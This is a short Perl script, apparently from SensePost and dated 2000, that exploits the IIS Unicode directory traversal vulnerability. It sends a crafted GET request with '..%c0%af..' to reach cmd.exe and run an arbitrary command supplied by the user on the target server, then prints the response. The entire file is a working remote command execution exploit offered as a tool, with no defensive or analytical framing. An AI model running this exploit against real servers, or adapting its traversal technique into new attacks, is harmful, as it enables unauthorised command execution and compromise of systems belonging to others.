#!/usr/bin/perl
# Very simple PERL script to execute LIMITED commands on IIS Unicode vulnerable servers
# Use port number with SSLproxy for testing SSL sites
# Usage: unicodexecute IP:port command
# Only makes use of "Socket" library
# Roelof Temmingh 2000/10/21
# roelof@sensepost.com http://www.sensepost.com

use Socket;
# --------------init
if ($#ARGV<1) {die "Usage: unicodexecute IP:port command\n";}
($host,$port)=split(/:/,@ARGV[0]);
$command=@ARGV[1];
print "Executing $command on $host:$port\n";
# WE NEED MORE TRANSLATION TABLES BELOW..ANYONE?
$command=~s/ /+/g;

$target = inet_aton($host);
# ---------------send the command
my @results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n");
print @results;
# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}
# Spidermark: sensepostdata


